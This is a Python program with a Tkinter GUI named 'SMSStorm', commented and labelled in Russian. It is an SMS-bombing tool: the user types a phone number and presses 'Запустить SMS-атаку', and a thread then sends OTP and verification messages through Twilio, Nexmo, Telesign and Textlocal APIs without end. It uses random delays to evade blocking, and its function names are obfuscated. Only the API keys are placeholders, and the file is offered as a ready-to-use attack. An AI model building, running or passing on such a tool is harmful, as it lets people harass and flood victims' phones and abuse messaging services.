import time
import random
import requests
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext

# SMS-атака
def _0x50(phone_number, stop_event, log_text):
    def send_sms(phone_number, service, log_text):
        try:
            # Реальные API для отправки SMS
            services = [
                {"url": "https://api.telesign.com/v1/phoneid", "data": {"phone_number": phone_number}, "headers": {"Authorization": "Basic YOUR_TELESIGN_API_KEY"}},
                {"url": "https://api.twilio.com/2010-04-01/Accounts/YOUR_TWILIO_SID/Messages.json", "data": {"To": phone_number, "From": "YOUR_TWILIO_NUMBER", "Body": "Test OTP"}, "auth": ("YOUR_TWILIO_SID", "YOUR_TWILIO_AUTH_TOKEN")},
                {"url": "https://api.nexmo.com/verify/json", "data": {"api_key": "YOUR_NEXMO_API_KEY", "api_secret": "YOUR_NEXMO_SECRET", "number": phone_number, "brand": "TestBrand"}},
                {"url": "https://api.textlocal.in/send/", "data": {"apiKey": "YOUR_TEXTLOCAL_API_KEY", "numbers": phone_number, "message": "Your verification code", "sender": "TXTLCL"}}
            ]
            service_data = services[service % len(services)]
            if "auth" in service_data:
                response = requests.post(service_data["url"], data=service_data["data"], auth=service_data["auth"], timeout=5)
            else:
                response = requests.post(service_data["url"], data=service_data["data"], headers=service_data.get("headers", {}), timeout=5)
            if response.status_code in [200, 201]:
                log_text.insert(tk.END, f"SMS sent to {phone_number} via service {service}\n")
            else:
                log_text.insert(tk.END, f"Failed to send SMS to {phone_number} via service {service}: {response.status_code}\n")
            with open(r"C:\Windows\Temp\sms_storm.log", "a") as f:
                f.write(f"[{time.ctime()}] SMS sent to {phone_number} via service {service}, status={response.status_code}\n")
        except Exception as e:
            log_text.insert(tk.END, f"SMS error for {phone_number}: {str(e)}\n")
            with open(r"C:\Windows\Temp\sms_storm.log", "a") as f:
                f.write(f"[{time.ctime()}] SMS error for {phone_number}: {str(e)}\n")

    service_counter = 0
    while not stop_event.is_set():
        send_sms(phone_number, service_counter, log_text)
        service_counter += 1
        time.sleep(random.randint(5, 15))  # Задержка для избежания блокировок

# GUI
def _0x46():
    root = tk.Tk()
    root.title("SMSStorm Pure Edition")
    root.geometry("600x400")
    root.resizable(False, False)

    stop_event = threading.Event()
    attack_thread = None

    # Главный фрейм
    main_frame = ttk.Frame(root)
    main_frame.pack(pady=10, padx=10, fill="both", expand=True)

    # Поле для номера телефона
    tk.Label(main_frame, text="Номер телефона (+1234567890):").pack()
    phone_var = tk.StringVar()
    phone_entry = tk.Entry(main_frame, textvariable=phone_var, width=20)
    phone_entry.pack(pady=5)

    # Лог событий
    log_text = scrolledtext.ScrolledText(main_frame, height=10, width=60)
    log_text.pack(pady=5)

    def start_attack():
        nonlocal attack_thread
        phone = phone_var.get()
        if not phone.startswith("+") or not phone[1:].isdigit():
            log_text.insert(tk.END, "Ошибка: Введите номер в формате +1234567890\n")
            return
        stop_event.clear()
        attack_thread = threading.Thread(target=_0x50, args=(phone, stop_event, log_text), daemon=True)
        attack_thread.start()
        log_text.insert(tk.END, f"Запущена SMS-атака на {phone}\n")

    def stop_attack():
        stop_event.set()
        if attack_thread:
            attack_thread.join(timeout=5.0)
        log_text.insert(tk.END, "SMS-атака остановлена\n")

    # Кнопки
    tk.Button(main_frame, text="Запустить SMS-атаку", command=start_attack).pack(pady=5)
    tk.Button(main_frame, text="Остановить атаку", command=stop_attack).pack(pady=5)

    root.mainloop()

# Запуск
if __name__ == "__main__":
    _0x46()